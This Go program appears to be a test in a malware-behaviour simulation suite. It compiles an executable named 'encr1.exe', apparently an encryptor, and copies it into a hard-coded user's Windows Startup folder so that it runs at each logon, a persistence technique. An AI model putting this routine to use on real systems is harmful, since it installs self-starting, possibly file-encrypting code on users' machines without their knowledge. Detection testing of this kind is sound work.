package main

import (
	"helpers"
	"io"
	"os"
	"os/exec"
)

func main() {
	name := helpers.CreateLogFileIfItDoesNotExist("./", "startup")
	helpers.WriteLog(name, "Strating: StartupFolderNewFile")
	helpers.CreateTestFiles("./", name)

	compileFile := exec.Command("go", "build", ".")
	compileFile.Dir = "./enc"

	err := compileFile.Run()
	if err != nil {
		helpers.WriteLog(name, "Error: "+err.Error())
		os.Exit(1)
	}

	src, err := os.Open("./enc/encr1.exe")
	if err != nil {
		helpers.WriteLog(name, "Error: "+err.Error())
		os.Exit(2)
	}

	dest, err := os.Create("C:/Users/achon/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/a.exe")
	if err != nil {
		helpers.WriteLog(name, "Error: "+err.Error())
		os.Exit(3)
	}

	_, err = io.Copy(dest, src)
	if err != nil {
		helpers.WriteLog(name, "Error: "+err.Error())
		os.Exit(4)
	}

	helpers.WriteLog("./startup.log", "End of test: StartupFolderNewFile")
}
